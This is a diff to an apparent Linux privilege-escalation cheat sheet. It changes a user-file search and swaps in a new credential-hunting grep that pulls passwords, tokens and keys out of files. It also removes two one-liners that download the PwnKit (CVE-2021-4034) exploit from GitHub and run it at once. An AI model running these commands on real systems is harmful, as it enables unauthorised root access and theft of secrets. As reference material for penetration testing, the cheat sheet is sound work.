@@ -152,36 +152,17 @@ old_ps=$(ps -eo user,command); while true; do new_ps=$(ps -eo user,command); dif
 ```
 {% endcode %}
 
-## Writable Scripts
+## User Files
 
 ```bash
-find / -user <USER> -writable \( -name "*.sh" -o -name "*.py" \) -type f 2>/dev/null
+find / -user <user> -xdev 2>/dev/null
 ```
 
 ## Passwords
 
 {% code overflow="wrap" %}
 ```bash
-grep -Eriao --color=always '(password|passwd|pass|pwd|key|secret|token)[[:space:]]*[:=][[:space:]]*[^[:space:]]{6,}' . | awk '{ line = $0; sub(/^[^:]*:[^:]*:/, "", line); if (!seen[line]++) print $0; }'
+grep -air -oP --exclude="*."{js,css,html} '(?i)[[:space:][:punct:]]?(password|pass|passwd|pwd|credentials|creds|secret|token|key)[[:space:][:punct:]]*[:=][[:space:]]*[^[:space:]]{4,}' . | sort -u | awk -F':' '{ match_str = substr($0, index($0,$2)); gsub(/^[[:space:]]+/, "", match_str); if (length(match_str) > 50) { match_str = substr(match_str, 1, 50) "..."; } blue = "\033[34m"; red = "\033[31m"; reset = "\033[0m"; print "\nFile:  " blue $1 reset "\nMatch: " red match_str reset;}'
 ```
 {% endcode %}
 
-## Exploits
-
-### Polkit - (CVE-2021-4034)
-
-[https://github.com/Almorabea/pkexec-exploit/tree/main](https://github.com/ly4k/PwnKit/tree/main)
-
-{% code overflow="wrap" %}
-```bash
-curl -sL https://raw.githubusercontent.com/Almorabea/pkexec-exploit/main/CVE-2021-4034.py -o PwnKit.py && python3 PwnKit.py
-```
-{% endcode %}
-
-[https://github.com/ly4k/PwnKit/tree/main](https://github.com/ly4k/PwnKit/tree/main)
-
-{% code overflow="wrap" %}
-```bash
-curl -sL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit && chmod +x PwnKit && ./PwnKit
-```
-{% endcode %}
